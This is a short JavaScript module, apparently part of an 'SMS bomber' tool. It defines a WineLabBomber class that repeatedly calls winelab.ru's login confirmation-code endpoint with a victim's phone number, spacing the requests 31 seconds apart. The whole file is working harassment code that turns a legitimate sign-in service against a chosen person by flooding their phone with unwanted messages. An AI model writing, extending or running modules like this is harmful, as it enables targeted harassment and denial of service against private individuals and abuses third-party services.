const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class WineLabBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = false;
    }
    headers = {
    }
    requestType = requestTypes.get;
    static country = "RU";
    siteName = "winelab";
    delay = 31000;
    url = `https://www.winelab.ru/login/send/confirmationcode?number=`+this.phone;  
}
module.exports = WineLabBomber;